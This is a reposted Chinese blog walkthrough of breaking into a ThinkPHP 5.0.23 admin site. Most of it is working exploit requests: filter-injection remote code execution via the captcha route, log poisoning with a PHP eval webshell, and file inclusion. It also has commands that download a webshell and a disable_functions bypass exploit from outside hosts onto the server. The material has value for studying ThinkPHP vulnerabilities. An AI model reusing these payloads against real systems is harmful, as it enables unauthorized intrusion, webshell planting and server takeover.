\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/9-Jhkfhsr5Z0Z-hBWMOPRw)

**信息收集**
--------

由于网站 www.a.com/admin，访问立即跳转到 www.a.com/admin/publicer/login

发现是 TP，5.0.23，在漏洞的版本范围内，尝试使用:

index.php?s=index/\\think\\app/invokefunction&function=call\_user\_func\_array&vars\[0\]=phpinfo&vars\[1\]\[\]=1s=index/\\think\\app/invokefunction&function=call\_user\_func\_array&vars\[0\]=system&vars\[1\]\[\]=id

\_method=\_\_construct&filter\[\]=system&method=GET&get\[\]=id

发现都不行，而且开启了 pathinfo, 明明在版本范围内，payload 打不成功怎么办

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2yqxwSXicicJiatWkGvAvvu4zNZR3wMGSWArCsaj9prGVr3VF1OiaMcWBlmicfU63HWWHhzo3yrEts1tA/640?wx_fmt=png)

查看验证码，继续使用 index.php?s=captcha 查看发现访问成功，change method,post，发现执行 system，返回 500，var\_dump 发现可以返回，说明代码能够执行成功  

```
POST /?s=captcha HTTP/1.1
Host: vulnhost
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_14\_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 83

\_method=\_\_construct&method=get&filter\[\]=var\_dump&server\[REQUEST\_METHOD\]=1&get\[\]=2
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2yqxwSXicicJiatWkGvAvvu4zpeYnXsxbzacnT59EGebSwXFr2RYxtEq05MXlnP1d6rUYBhTEbD1DhQ/640?wx_fmt=png)

查看 phpinfo:  

```
POST /?s=captcha HTTP/1.1
Host: vulnhost
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_14\_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 83

\_method=\_\_construct&method=get&filter\[\]=phpinfo&server\[REQUEST\_METHOD\]=1&get\[\]=4
```

查看相关的信息后，disable\_functions：

```
passthru,exec,system,putenv,chroot,chgrp,chown,shell\_exec,popen,proc\_open,pcntl\_exec,ini\_alter,ini\_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl\_alarm,pcntl\_fork,pcntl\_waitpid,pcntl\_wait,pcntl\_wifexited,pcntl\_wifstopped,pcntl\_wifsignaled,pcntl\_wifcontinued,pcntl\_wexitstatus,pcntl\_wtermsig,pcntl\_wstopsig,pcntl\_signal,pcntl\_signal\_dispatch,pcntl\_get\_last\_error,pcntl\_strerror,pcntl\_sigprocmask,pcntl\_sigwaitinfo,pcntl\_sigtimedwait,pcntl\_exec,pcntl\_getpriority,pcntl\_setpriority,imap\_open,apache\_setenv
```

目录知道的信息如下：  

thinkphp 5.0.23  
/www/wwwroot/vulhost/public/index.php  
禁用函数  
php 7.2.18，没办法 assert  
open\_basedir /www/wwwroot/vulhostcn/:/tmp/:/proc/  
首先想到的是，更新其他函数尝试，以及一些 bypass 绕过 disable\_functions，但是 payload 目前只能传入一个参数，并且还限制了很多函数.

```
\_method=\_\_construct&method=get&filter\[\]=think\\\_\_include\_file&server\[\]=-1&get\[\]=/tmp/sess\_asd
  \_method=\_\_construct&method=get&filter\[\]=think\\Session::set&get\[\]=<?php x?>
```

发现不成功，可能 session 位置不对，查看 phpinfo:

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2yqxwSXicicJiatWkGvAvvu4zWfsv2NNANokhPIynwc9GMSfiarTf4SRCYPicsbQN6X97nwUlRbz4v9cw/640?wx_fmt=png)

发现吧 session 写到了 redis 里，那尝试 redis 来 getshell 试试：

```
\_method=\_\_construct&method=get&filter\[\]=think\\\_\_include\_file&server\[REQUEST\_METHOD\]=../data/runtime/log/202004/04.log&c=curl\_exec(curl\_init("dict://127.0.0.1:6379/info"));
```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2yqxwSXicicJiatWkGvAvvu4zbbrB8oUmHWvbMficy7IqC9CMP7ibsGE3GKecnxbuwaYVse52JYicJGLYw/640?wx_fmt=png)

失败告终，尝试其他办法  

发现 readfile 是可以的，先读取 index.php 确定文件路径

```
\_method=\_\_construct&method=get&filter\[\]=readfile&server\[REQUEST\_METHOD\]=/www/wwwroot/vulhost/public/index.php
```

通过读取 index.php

确定路径，读取 log

```
\_method=\_\_construct&method=get&filter\[\]=readfile&server\[REQUEST\_METHOD\]=/www/wwwroot/vulhostcn/data/runtime/log/202004/04.log
\_method=\_\_construct&method=get&filter\[\]=call\_user\_func&server\[REQUEST\_METHOD\]=<?php eval($\_POST\['c'\]);?>
\_method=\_\_construct&method=get&filter\[\]=think\\\_\_include\_file&server\[REQUEST\_METHOD\]=../data/runtime/log/202004/04.log&c=phpinfo();
```

文件包含成功，此漏洞详情可 查看 https://xz.aliyun.com/t/6106

至此就基本上搞定了

传免杀 shell:

```
file\_put\_contents("/www/wwwroot/vulnstcn/debug.php",file\_get\_contents("http://scan.javasec.cn/xxxxx"))
```

查看目录文件：

```
\_method=\_\_construct&method=get&filter\[\]=think\\\_\_include\_file&server\[REQUEST\_METHOD\]=../data/runtime/log/202004/04.log&c=print\_r(scandir("/www/wwwroot/vulhostcn/public/"));
```

bypass disable\_functions, 参考：https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass

```
\_method=\_\_construct&method=get&filter\[\]=think\\\_\_include\_file&server\[REQUEST\_METHOD\]=../data/runtime/log/202004/04.log&c=file\_put\_contents("/www/wwwroot/vulhostcn/public/themes/admin\_themes/3.php",file\_get\_contents("http://vps:65534/exploit.php"));
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic2yqxwSXicicJiatWkGvAvvu4z6YDT4PI6IUKia2vLHW5xxDicrAtJxLOalDtSqjRGnJMJ8c4iaKnfCOpsw/640?wx_fmt=png)

fpm 方式利用:

fpm 没有使用 tcp 的方式，而是使用了 unix 的 socket

```
$sock = stream\_socket\_client('unix:///tmp/php-fcgi.sock',$errno,$errstr);
```

redis 后 自己在 shell 里上传个 so 实现的命令执行等等，不过都是一些方向上的思路，可以以后尝试。

作者：sevck，文章来源：先知社区

**关注公众号: HACK 之道**  

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3qL1R1NCVbY1ElanNngBlMTUKUibAUoQNQuufs7QibuMXoBHX5ibneNiasMzdthUAficktvRzexoRTXuw/640?wx_fmt=jpeg)